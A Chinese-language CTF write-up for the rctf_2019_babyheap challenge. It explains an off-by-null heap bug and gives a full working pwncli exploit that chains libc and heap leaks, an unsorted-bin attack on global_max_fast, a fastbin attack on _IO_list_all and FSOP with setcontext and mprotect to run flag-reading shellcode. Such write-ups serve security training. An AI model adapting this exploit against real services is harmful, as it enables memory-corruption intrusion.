# rctf_2019_babyheap



### 总结

禁用了`fastbin`，同时有`off by null`的漏洞。做出来后发现很多人的解是用的`house of storm`进行任意地址申请，覆盖`__free_hook`后，然后利用`setcontext`读取到的`flag`。我的方法却是利用的`unsortedbin attack`+`fastbin attack`，修改了`global_max_fast`的值之后，利用`stdout`泄露出堆地址，然后劫持`_IO_list_all`，用`FSOP`利用`mprotect`拿的`flag`。为啥不用`house of storm`，因为写起来麻烦，而我比较喜欢偷懒~

`libc`映射的空间上储存了堆地址和程序地址，如果能打`stdout`，那么想要啥地址基本都有。

<!-- more -->

### 题目分析

#### checksec

![image-20210905232436496](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905232436496.png)

保护全开，`libc-2.23.so`

#### seccomp

![image-20210905232507909](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905232507909.png)

#### 函数分析

##### initial

![image-20210905232544422](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905232544422.png)

禁用了`fastbin`

##### add

![image-20210905232650185](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905232650185.png)

这里比较坑的是限制了`size`，否则直接`unsortbin attack`之后，都不需要泄露堆地址了。

其他函数没啥特殊的，漏洞放在下面分析。

#### 漏洞点

一个`off by null`的漏洞

![image-20210905231717339](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905231717339.png)

### 利用思路

这里直接给利用思路：

- 使用`off by null`制作三明治，然后泄露出`libc`地址
- 使用`stdout`泄露出`heap`地址。当然，使用`largebin`、`smallbin`等也是可以的
- `unsorted bin attack`修改`global_max_fast`
- 利用`fastbin attack`劫持`_IO_list_all`
- `FSOP`控制程序执行流

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(size:int):
    p.sendlineafter("Choice: \n", "1")
    p.sendlineafter("Size: ", str(size))


def edit(idx:int, data:(str, bytes)):
    p.sendlineafter("Choice: \n", "2")
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("Content: ", data)


def delete(idx:int):
    p.sendlineafter("Choice: \n", "3")
    p.sendlineafter("Index: ", str(idx))


def show(idx:int):
    p.sendlineafter("Choice: \n", "4")
    p.sendlineafter("Index: ", str(idx))
    return p.recvline()


add(0x80) # 0
add(0x68) # 1
add(0xf0) # 2
add(0x800) # 3


delete(0)
edit(1, flat(["a" * 0x60, 0x100]))

delete(2)

add(0x80)
msg = show(1)
libc_base_addr = u64(msg[:-1].ljust(8, b"\x00")) - 0x3c4b78
libc.address = libc_base_addr

log_address("libc_base_addr", libc_base_addr)

delete(0)

add(0xf0)
add(0xf0)

delete(0)
add(0x80)

edit(1, flat([0, libc_base_addr + 0x3c67f8 - 0x10]))

add(0x60)

delete(1)

edit(4, p64(libc.sym["_IO_2_1_stdout_"] - 0x43))

add(0x60)

add(0x68) # 5

edit(5, flat("\x00" * 0x33, 0xfbad1887, 0, 0, 0, libc.sym['__curbrk'] - 8, libc.sym['__curbrk'] + 8))

msg = p.recvn(16)
heap_base_addr = u64(msg[8:]) - 0x21000
log_address("heap_base_addr", heap_base_addr)

delete(1)
edit(4, p64(libc.sym["_IO_list_all"] - 0x23))

add(0x60)
add(0x60)
edit(6, flat(["\x00" * 0x13, heap_base_addr+0x210]))

delete(3)
add(0x800) # 3

payload = flat({
    0x18:libc.sym['setcontext']+0x35,
    0x28:1,
    0xd8:heap_base_addr+0x210,
    0xa0:heap_base_addr+0x210+0x100,
    0xa8:libc.sym['mprotect'],
    0x100: heap_base_addr+0x180+0x210,
    0x68: heap_base_addr,
    0x70: 0x3000,
    0x88: 7,
    0x180:asm(shellcraft.cat("/flag"))
}, filler="\x00")

edit(3, payload)

p.sendlineafter("Choice: \n", "5")

p.interactive()
```

泄露`libc`：

![image-20210905234000302](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905234000302.png)

泄露`heap`：

![image-20210905234039802](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905234039802.png)

劫持`_IO_list_all`：

![image-20210905234134429](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905234134429.png)

准备`ROP`读取`flag`：

![image-20210905234303701](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905234303701.png)

远程打：

![image-20210905234433315](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905234433315.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-09-05-rctf-2019-babyheap/  

